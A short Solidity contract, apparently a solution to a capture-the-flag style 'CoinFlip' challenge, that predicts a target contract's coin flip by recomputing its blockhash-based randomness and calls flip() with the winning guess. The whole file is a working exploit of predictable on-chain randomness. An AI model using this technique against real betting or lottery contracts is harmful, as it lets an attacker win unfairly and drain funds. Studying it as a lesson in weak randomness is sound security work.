// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuess {
    address public coinFlipAddress;
    uint256 public consecutiveWins = 0;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        coinFlipAddress = _coinFlipAddress;
    }

    function coinFlipGuess() external returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool isRight = ICoinFlip(coinFlipAddress).flip(side);
        if (isRight) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }

        return consecutiveWins;
    }
}